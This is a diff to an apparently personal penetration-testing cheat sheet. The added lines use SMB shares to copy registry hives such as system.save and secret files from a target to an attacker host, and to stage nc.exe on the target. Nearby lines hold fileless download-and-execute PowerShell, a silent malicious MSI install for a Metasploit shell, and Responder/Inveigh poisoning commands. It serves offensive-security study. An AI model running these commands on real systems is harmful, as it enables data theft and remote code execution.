@@ -47,9 +47,19 @@
         ###Upload
             IEX(New-Object Net.WebClient).DownloadString('file url')
             Invoke-FileUpload -Uri http://Local IP:8000/upload -File C:\Windows\System32\drivers\etc\hosts
+            SMB
+                On Linux: sudo impacket-smbserver share /home/kali -smb2support
+                On CMD: copy system.save \\IP\share\system.save
+
+                On Linux: impacket-smbserver hax $(pwd) -smb2support
+                On PS or CMD: copy C:\temp\supersecret.txt \\A_IP\hax\supersecret.txt
         ###Download
             (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
             Invoke-WebRequest target file url -OutFile PowerView.ps1
+            SMB
+                On Linux: impacket-smbserver hax $(pwd) -smb2support
+                On PS or CMD: copy \\A_IP\hax\nc.exe C:\temp\nc.exe
+
             ####File less
                 IEX (New-Object Net.WebClient).DownloadString('Target File Url')
                 (New-Object Net.WebClient).DownloadString('Target File URL') | IEX
@@ -516,6 +526,7 @@ Registry
         On B: 
             Invoke-WebRequest http://A_IP:8000/setup.msi -OutFile setup.msi
             Move file to C:\temp  >  PS: msiexec /quiet /qn /i C:\Temp\setup.msi  >  should have shell on MSF
+            
 Service Escalation
     Registry
         On B PS:  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl  -  user has “NT AUTHORITY\INTERACTIVE” “FullContol”
@@ -548,9 +559,14 @@ Service Escalation
 ### Enumeration
 #### Passive
 ```c
+Linux
 sudo tcpdump -i ens224
 
-sudo responder -I ens224 -A
+sudo responder -I ens224 -v
+
+Windows
+.\Inveigh.exe
+
 ```
 
 #### Active
